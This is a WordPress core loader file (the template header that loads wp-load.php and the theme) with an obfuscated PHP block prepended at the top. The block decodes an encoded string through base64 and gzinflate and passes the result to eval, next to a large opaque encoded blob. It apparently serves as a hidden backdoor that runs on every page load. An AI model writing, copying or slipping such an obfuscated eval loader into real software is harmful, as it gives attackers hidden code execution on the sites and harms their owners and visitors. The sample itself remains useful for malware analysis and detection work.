<?php
$Cyto = "Sy1LzNFQt1dLL7FW10uvKs1Lzs8tKEotLtZIr8rMS8tJLEnVSEosTjUziU9JT\x635PSdUoLikqSi3TUPHJrNAE\x41Ws\x41";
$Lix = "2G7IdMw/513/K56fuH19NT8UGfAyvw/6syQeVsKIrppEcIcORA9xFuowTQjlxmgwlDNpFHN4iP24SSeGgnuZXCzRvtjWSehGETqvT1ZFFb/I1vQfcDHGth9dtVOi0Jx6GL8n2VempCDjcyu5y32evlt5pCk+KH56Dd5PDFdJZlSbulWm/s4e6WbdTgjgJMq7WnTSU3In1Qh5NCSqcIEWUup/iJ+cUVirxg1aBaKdXVyCOXZpAPHSFm03zJjqMKetd19p0+dg5p2NFI/jWa/9T9/eR54InxWBRh4TyFslek8nlt0zlgfwHjryFZ+ThEuYFfIoM9qS5BMzYNIN41yNIX/sVZKP7FgSZzOTs1OGp7IC8r6LyzJglTIvXPhV4m0q+QVIv127yr4l6whmJBSpmm89Er7tA38C0TozeaBHnBko+hv7kOmMxiQ5CJaYHk662uhGDErJa0ev/346bvG+np33PfLYqEuvuHg9lQPTxXx/NWTi+4OtTfI/HYqIrdIDaAykX/0gPgMOW9lxPDzlnuMDYA3gvMsrNqR/Z8rfS6pxyj+ri+FG8KxuBtj4FCTK5hn6/WyxJh4vhyp4JKokwxkN8QBk11rthIdMDNZ6sQEICrAMhFONB3KMkLRp2aU6s2EXQgPNbJe3TIHZjv+eCvAvgce0bJYBLGZGGFtHSKYrhgaBNBMpdozgWpOH7fLbUAtW5xEdmD5YIKTHWq6OsLXgdGQlgrY/8l5lX73dO/uH37rAkY0n1tpS/CyOv3vlLyy2tE7GAnjLCpCpdXqiarcVyqhisIrUhdfTLIlAiu4g/nmP9DBMb+27U1Ln41fkC4WA";
eval(htmlspecialchars_decode(gzinflate(base64_decode($Cyto))));
?>
<?php
/**
 * Loads the WordPress environment and template.
 *
 * @package WordPress
 */

if ( ! isset( $wp_did_header ) ) {

    $wp_did_header = true;

    // Load the WordPress library.
    require_once __DIR__ . '/wp-load.php';

    // Set up the WordPress query.
    wp();

    // Load the theme template.
    require_once ABSPATH . WPINC . '/template-loader.php';

}
?>
